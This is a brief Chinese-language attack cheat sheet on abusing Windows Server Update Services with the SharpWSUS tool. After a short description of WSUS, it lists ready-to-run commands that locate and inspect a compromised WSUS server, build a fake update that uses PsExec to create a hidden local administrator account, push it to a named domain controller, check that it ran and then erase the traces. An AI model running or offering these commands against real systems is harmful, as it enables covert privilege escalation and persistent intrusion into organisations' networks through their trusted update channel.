	Windows Server Update Services (WSUS) 使信息技术管理员能够部署最新的 Microsoft 产品更新。您可以使用 WSUS 全面管理通过 Microsoft Update 发布到网络上的计算机的更新的分发
	有效负载必须是 Microsoft 签名的二进制文件，并且必须指向磁盘上的某个位置，以便 WSUS 服务器加载该二进制文件。
	https://github.com/nettitude/SharpWSUS
	使用HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate或定位SharpWSUS.exe locate
	WSUS 服务器入侵后：SharpWSUS.exe inspect
	创建恶意补丁：SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add && net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo"
	在目标上部署它：SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:"Demo Group"
	检查状态部署：SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local
	清理：SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:”Demo Group